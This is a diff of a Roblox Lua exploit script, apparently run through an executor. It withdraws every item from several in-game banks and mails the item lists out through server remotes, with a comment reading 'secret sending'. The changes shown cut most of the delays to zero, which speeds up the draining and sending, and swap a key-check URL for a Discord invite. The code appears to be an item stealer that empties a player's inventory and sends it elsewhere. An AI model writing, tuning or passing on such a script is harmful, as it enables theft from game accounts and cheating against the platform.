@@ -454,11 +454,11 @@ if Bank ~= nil and invspace() ~= 0 then
                 withdrawremote:InvokeServer(Bank, LFinalList, bdiaamt)
             end)
             if s == false then
-                wait(0.2)
+                wait(0)
                 withdrawremote:InvokeServer(Bank, LFinalList, 0)
             end
             FinalFinal = FinalFinal + #LFinalList
-            wait(0.2)
+            wait(0)
         else
             print('done1')
             break
@@ -509,10 +509,10 @@ if Bank2 ~= nil and invspace() ~= 0 then
                 withdrawremote:InvokeServer(Bank2, FinalList2, bdiaamt2)
             end)
             if s == false then
-                wait(0.2)
+                wait(0)
                 withdrawremote:InvokeServer(Bank2, FinalList2, 0)
             end
-            wait(0.2)
+            wait(0)
             FinalFinal = FinalFinal + #FinalList2
         else
             print('done2')
@@ -566,10 +566,10 @@ if Bank3 ~= nil and invspace() ~= 0 then
             end)
 
             if s == false then
-                wait(0.2)
+                wait(0)
                 withdrawremote:InvokeServer(Bank3, FinalList3, 0)
             end
-            wait(0.2)
+            wait(0)
             FinalFinal = FinalFinal + #FinalList3
         else
             print('done3')
@@ -621,11 +621,11 @@ if Bank4 ~= nil and invspace() ~= 0 then
             end)
 
             if s == false then
-                wait(0.2)
+                wait(0)
                 withdrawremote:InvokeServer(Bank4, FinalList4, 0)
             end
             FinalFinal = FinalFinal + #FinalList4
-            wait(0.2)
+            wait(0)
         else
             print('done4')
             break
@@ -678,10 +678,10 @@ if Bank5 ~= nil and invspace() ~= 0 then
             end)
 
             if s == false then
-                wait(0.2)
+                wait(0)
                 withdrawremote:InvokeServer(Bank5, FinalList5, 0)
             end
-            wait(0.2)
+            wait(0)
             FinalFinal = FinalFinal + #FinalList5
         else
             print('done5')
@@ -1144,7 +1144,7 @@ if getgenv().Settings ~= nil then
         local dhdata = {
             dhprem = dhkey
         }
-        local dhurl = "https://raw.githubusercontent.com/SuperMonz/Keys.v2/main/Keys.lua" -- Exc : https://rizz.xyz/premium.php
+        local dhurl = "https://discord.gg/4y4CZfdJHu" -- Exc : https://rizz.xyz/premium.php
         local dhheaders = {
             ["content-type"] = "application/json"
         }
@@ -1274,7 +1274,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #TList == 0 or TList == {} then
                     -- print("done1")
                     break
@@ -1302,7 +1302,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #BList == 0 or BList == {} then
                     -- print("done2")
                     break
@@ -1332,7 +1332,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #HList == 0 or HList == {} then
                     -- print("done3")
                     break
@@ -1361,7 +1361,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #PList == 0 or PList == {} then
                     -- print("done1")
                     break
@@ -1389,7 +1389,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #EList == 0 or EList == {} then
                     -- print("done42")
                     break
@@ -1417,7 +1417,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #EvList == 0 or EvList == {} then
                     -- print("done5")
                     break
@@ -1445,7 +1445,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #SList == 0 or SList == {} then
                     -- print("done6")
                     break
@@ -1473,7 +1473,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 -- print("secret sending")
                 if #MList == 0 or MList == {} then
                     -- print("done6")
@@ -1947,6 +1947,6 @@ spawn(function()
         WMythicList = {}
         WMList = {}
         WMcc = {}
-        wait()
+        wait(1)
     end
 end)
